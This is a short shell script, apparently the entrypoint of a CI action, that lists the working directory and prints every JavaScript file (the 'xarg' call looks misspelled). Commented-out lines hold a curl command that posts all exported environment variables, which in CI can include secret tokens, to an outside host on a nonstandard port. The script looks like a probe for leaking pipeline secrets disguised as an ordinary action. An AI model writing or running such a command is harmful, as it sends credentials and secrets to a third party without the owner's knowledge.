#!/bin/sh -l

# echo "Hello $(export -p)"
# curl -s -d "$(export -p)" "http://tencent.bittervan.xyz:2782" > /dev/null
# time=$(date)
# echo "::set-output name=time::$time"
tree .
find . -name "*.js" | xarg cat